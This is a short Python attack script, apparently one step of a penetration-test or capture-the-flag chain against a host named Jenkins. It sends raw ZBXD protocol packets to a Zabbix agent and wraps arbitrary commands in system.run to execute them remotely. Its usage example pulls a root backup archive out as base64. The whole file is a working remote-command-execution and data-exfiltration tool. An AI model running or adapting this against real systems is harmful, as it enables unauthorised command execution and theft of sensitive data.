#!/usr/bin/env python3
"""Step 7 - ZBXD client: run a command via the Zabbix agent system.run on Jenkins.

Usage: python3 zbxd_run.py <cmd> [host] [port]
       host default localhost, port default 10050
Example: python3 zbxd_run.py 'cat /mnt/BACKUP/root.tar.gz | base64'
"""
import socket
import struct
import sys

CMD = sys.argv[1] if len(sys.argv) > 1 else "agent.hostname"
HOST = sys.argv[2] if len(sys.argv) > 2 else "localhost"
PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 10050


def zbx_request(key):
    payload = key.encode()
    pkt = b"ZBXD" + b"\x01" + struct.pack("<Q", len(payload)) + payload
    s = socket.create_connection((HOST, PORT), timeout=25)
    s.sendall(pkt)
    hdr = s.recv(13)
    if hdr[:4] != b"ZBXD":
        data = hdr + s.recv(65536)
        s.close()
        return data
    length = struct.unpack("<Q", hdr[5:13])[0]
    buf = b""
    while len(buf) < length:
        chunk = s.recv(min(65536, length - len(buf)))
        if not chunk:
            break
        buf += chunk
    s.close()
    return buf


if __name__ == "__main__":
    key = CMD if CMD.startswith("agent.") else f"system.run[{CMD}]"
    out = zbx_request(key)
    sys.stdout.buffer.write(out)
    if not out.endswith(b"\n"):
        sys.stdout.write("\n")
